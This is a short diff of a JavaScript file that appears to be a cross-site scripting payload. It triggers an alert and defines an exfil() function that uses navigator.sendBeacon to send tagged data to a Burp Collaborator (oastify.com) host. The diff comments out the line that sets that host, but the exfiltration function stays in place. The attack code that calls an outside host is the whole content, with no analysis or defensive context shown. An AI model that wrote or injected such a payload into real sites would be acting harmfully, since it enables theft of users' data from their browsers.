@@ -1,6 +1,6 @@
 alert('xss argentuml');
 
-var COLLAB = 'https://9s2mih6vfcvkogr4v94edwuj1a71vvjk.oastify.com';
+//var COLLAB = 'https://9s2mih6vfcvkogr4v94edwuj1a71vvjk.oastify.com';
 
 function exfil(tag, data) {
   try { navigator.sendBeacon(COLLAB + '/?t=' + tag, String(data)); } catch (e) {}
